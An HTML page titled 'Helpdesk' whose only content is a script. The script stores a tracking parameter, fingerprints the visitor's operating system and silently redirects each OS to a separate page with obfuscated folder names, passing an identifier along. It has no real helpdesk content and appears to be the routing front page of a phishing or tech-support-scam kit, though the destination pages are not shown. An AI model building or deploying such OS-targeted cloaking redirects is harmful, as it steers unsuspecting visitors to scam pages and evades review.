<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Helpdesk</title>

<script>
function getQueryParam(param) { 
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

function checkOperatingSystem() {
    const ua = navigator.userAgent;

    if (/windows/i.test(ua)) return "Windows";
    if (/android/i.test(ua)) return "Android";
    if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
    if (/mac/i.test(ua)) return "MacOS";
    if (/linux/i.test(ua)) return "Linux";

    return "Unknown";
}

window.onload = function () {

    // Get query params safely
    let alpha = getQueryParam('alpha');
    let bcda = getQueryParam('bcda');

    // Store alpha only if exists
    if (alpha) {
        localStorage.setItem('alpha', alpha);
    }

    // Prevent crash if bcda is null
    if (!bcda) {
        console.error("Missing 'bcda' parameter");
        return;
    }

    bcda = bcda.trim();

    // Detect OS
    let os = checkOperatingSystem();

    // Redirect based on OS
    let basePath = "";

    switch (os) {
        case "MacOS":
            basePath = "MerxiC0deinfousahtml/index.html";
            break;
        case "Android":
            basePath = "andx010usahTml/index.html";
            break;
        case "iOS":
            basePath = "ioxs010usxhYMl/index.html";
            break;
        default:
            basePath = "webC0deinfousavhtml/index.html";
    }

    // Final redirect
    window.location.href = basePath + "?bcda=" + encodeURIComponent(bcda);
};
</script>

</head>
<body>
</body>
</html>
